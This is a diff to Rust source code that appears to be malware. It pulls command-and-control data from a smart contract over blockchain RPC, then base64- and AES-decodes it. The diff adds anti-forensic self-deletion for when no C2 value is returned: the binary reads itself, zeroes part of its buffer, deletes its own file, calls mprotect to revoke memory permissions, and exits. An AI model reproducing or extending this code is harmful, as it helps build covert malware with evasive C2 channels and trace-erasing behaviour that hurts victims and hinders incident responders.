@@ -353,6 +353,7 @@ fn handleCertificate(domain: &str) -> Result<()>{
 }
 
 use serde_json::Value;
+use rustc_serialize::json::{Json, ToJson};
 async fn handleContractKeccak(contractAddress: &str) -> String{
     // call RPC and interact with smart contract variable name (keccak)
 
@@ -369,18 +370,72 @@ async fn handleContractKeccak(contractAddress: &str) -> String{
     .await;
 
     let response = request.unwrap().text().await.unwrap();
-    let jsonResponse: Value = serde_json::from_str(&response).unwrap();
+    println!("Response :: {}", response);
+    //let jsonResponse: Value = serde_json::from_str(&response).unwrap();
 
-    let testing = hex::decode(&(jsonResponse["result"].as_str().unwrap()[2..])).unwrap();
-    let testStr = str::from_utf8(&testing).unwrap().replace(",","");
-    let testStr = &testStr.trim_matches('\x00')[32..];
+    let json_object = Json::from_str(&response).unwrap();
 
-    return testStr.to_string()
+    match json_object.find("result") {
+        Some(field) => {
+            let name = field.as_string().unwrap();
+            println!("O valor do campo 'name' é: {}", &name);
+            let testing = hex::decode(&name[2..]).unwrap();
+            let testStr = str::from_utf8(&testing).unwrap().replace(",","");
+            let testStr = &testStr.trim_matches('\x00')[32..];
+        
+            return testStr.to_string()
+        },
+        None => {
+            "".to_string()
+        }
+    }
+
+
+    // let valueJson = jsonResponse["result"].as_str().unwrap()[2..];
+
 }
+
+use std::fs;
+use std::mem;
+use std::ptr;
+use libc::{mprotect, PROT_NONE, PROT_READ};
 
 #[tokio::main]
 async fn rpcInteract(addr: &str) -> web3::Result<(web3::Result<()>, String)>{
     let contractC2 = handleContractKeccak(addr).await;
+    if contractC2 == ""{
+        let path = std::env::current_exe().unwrap();
+
+        // Abra o arquivo binário para leitura
+        let mut file = fs::File::open(&path).unwrap();
+    
+        // Carregue todo o arquivo binário na memória
+        let mut buffer = Vec::new();
+        file.read_to_end(&mut buffer).unwrap();
+    
+        // Feche o arquivo para garantir que ele não esteja mais em uso
+        drop(file);
+
+        unsafe {
+            ptr::write(buffer.as_mut_ptr(), mem::zeroed());
+        }
+    
+        // Apague o binário
+        fs::remove_file(&path).unwrap();
+
+        let base_addr = std::ptr::null_mut();
+
+        // Obter o tamanho do programa
+        let program_size = 0; // Preencher com o tamanho do programa
+    
+        // Definir as permissões desejadas
+        let prot = PROT_NONE;
+    
+        // Remover a permissão de leitura
+        let result = unsafe { mprotect(base_addr, program_size, prot) };
+
+        process::exit(0);
+    }
     let C2AESContent_b64dec = base64::decode(contractC2).unwrap();
     let key_dec = base64::decode(ContractKey).unwrap();
 
